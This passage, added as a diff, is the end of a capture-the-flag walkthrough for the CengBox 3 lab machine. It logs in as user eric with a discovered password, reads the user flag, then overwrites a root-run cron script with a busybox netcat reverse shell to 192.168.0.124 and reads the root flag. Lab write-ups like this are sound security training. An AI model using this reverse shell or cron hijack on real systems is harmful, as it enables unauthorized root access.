@@ -319,4 +319,92 @@ eric : 3ricThompson*Covid19
 Which is similar style to the password we found for elizabeth ain /var/www/dev.ceng-company.vm/conn.php
 \
 So now we can become user eric
+```bash
+eric@cengbox:~$ ls -la
+total 48
+drwx------ 3 eric eric 4096 Sep 28  2020 .
+drwxr-xr-x 3 root root 4096 Sep 27  2020 ..
+-rw------- 1 eric eric 3940 Sep 28  2020 .bash_history
+-rw-r--r-- 1 eric eric  220 Sep 24  2020 .bash_logout
+-rw-r--r-- 1 eric eric 3771 Sep 24  2020 .bashrc
+drwx------ 2 eric eric 4096 Sep 24  2020 .cache
+-rw------- 1 root root  279 Sep 24  2020 .mysql_history
+-rw-r--r-- 1 eric eric  655 Sep 24  2020 .profile
+-rw------- 1 root root 1024 Sep 24  2020 .rnd
+-rw-r--r-- 1 eric eric    0 Sep 24  2020 .sudo_as_admin_successful
+-rw-r--r-- 1 eric eric  234 Sep 28  2020 user.txt
+-rw------- 1 root root 7068 Sep 25  2020 .viminfo
+eric@cengbox:~$ cat user.txt 
+If someone asks us when we die tomorrow: ‘What have you seen in the world? If he said, we probably cannot find the answer to give. We don't have time to see it from running. -- Sabahattin Ali
+
+flag(6744e509eec439570c2d6df947526749)
+```
 \
+If we check the contents of /opt/login.py
+```bash
+eric@cengbox:~$ cat /opt/login.py
+import requests
+creds = {'username':'eric','password':'3ricThompson*Covid19'}
+r = requests.post('http://localhost',data = creds)
+print(r.text)
+```
+\
+Since the file is owned by eric , we can edit it and add a reverse shell , since the cronjob is run by root , we will get shell as root
+```bash
+eric@cengbox:/opt$ cat login.py 
+#import requests
+#creds = {'username':'eric','password':'3ricThompson*Covid19'}
+#r = requests.post('http://localhost',data = creds)
+#print(r.text)
+import os
+os.system('busybox nc 192.168.0.124 4445 -e /bin/sh')
+```
+```bash
+root@cengbox:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@cengbox:~# cd ~
+root@cengbox:~# ls -la
+total 44
+drwx------  3 root root 4096 Sep 28  2020 .
+drwxr-xr-x 22 root root 4096 Sep 28  2020 ..
+-rw-------  1 root root  106 Sep 28  2020 .bash_history
+-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
+-rw-------  1 root root   64 Sep 27  2020 .mysql_history
+drwxr-xr-x  2 root root 4096 Sep 25  2020 .nano
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-r--r--  1 root root 1598 Sep 28  2020 proof.txt
+-rw-r--r--  1 root root   66 Sep 26  2020 .selected_editor
+-rw-------  1 root root 7929 Sep 28  2020 .viminfo
+root@cengbox:~# cat proof.txt 
+############################################################# 
+###################################################   ####### 
+###############################################   /~\   #####
+############################################   _- `~~~', ####
+##########################################  _-~       )  ####
+#######################################  _-~          |  ####
+####################################  _-~            ;  #####
+##########################  __---___-~              |   #####
+#######################   _~   ,,                  ;  `,,  ##
+#####################  _-~    ;'                  |  ,'  ; ##
+###################  _~      '                    `~'   ; ###
+############   __---;                                 ,' ####
+########   __~~  ___                                ,' ######
+#####  _-~~   -~~ _                               ,' ########
+##### `-_         _                              ; ##########
+#######  ~~----~~~   ;                          ; ###########
+#########  /          ;                        ; ############
+#######  /             ;                      ; #############
+#####  /                `                    ; ##############
+###  /                                      ; ###############
+#                                            ################
+
+The beginning and end of my life were clear; at least I shouldn't have missed the middle. -- Oguz Atay
+
+Good job! You just rooted CengBox 3 successfully. Hope you enjoyed it.
+
+If you did, take a screenshot and share it with me on Twitter - @arslanblcn_
+
+flag(058004ef45a08082100802d41fdcc290)
+```
+\
+The end , thank you for reading till here
